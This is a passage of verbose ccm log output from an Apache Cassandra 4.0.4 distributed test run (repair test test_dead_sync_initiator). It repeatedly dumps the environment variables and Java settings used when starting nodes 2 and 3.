'/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node2/conf'}
02:33:12 00:33:12,831 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node2/conf'}
02:33:12 00:33:12,832 ccm INFO node2: using Java 8 for the current invocation
02:33:12 00:33:12,832 ccm INFO node2: using Java 8 for the current invocation
02:33:12 00:33:13,23 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node2/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
02:33:13 00:33:13,23 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node2/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
02:33:13 00:33:13,24 ccm INFO node2: using Java 8 for the current invocation
02:33:13 00:33:13,24 ccm INFO node2: using Java 8 for the current invocation
02:33:13 00:33:13,114 ccm INFO Starting node2 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
02:33:13 00:33:13,114 ccm INFO Starting node2 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
02:33:13 00:33:13,434 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/conf'}
02:33:13 00:33:13,434 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/conf'}
02:33:13 00:33:13,435 ccm INFO node3: using Java 8 for the current invocation
02:33:13 00:33:13,435 ccm INFO node3: using Java 8 for the current invocation
02:33:13 00:33:13,637 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 